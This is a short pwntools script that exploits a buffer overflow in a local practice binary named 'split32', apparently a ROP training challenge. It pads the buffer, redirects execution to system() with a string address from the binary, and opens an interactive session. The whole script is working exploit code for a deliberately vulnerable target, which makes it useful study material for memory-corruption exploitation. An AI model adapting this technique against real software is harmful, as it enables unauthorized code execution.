from pwn import *

binary = './split32'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

payload = b'a'*44
payload+= p32(elf.symbols.system)
payload+= b'a'*4
payload+= p32(0x804a030)

p.sendline(payload)
p.interactive()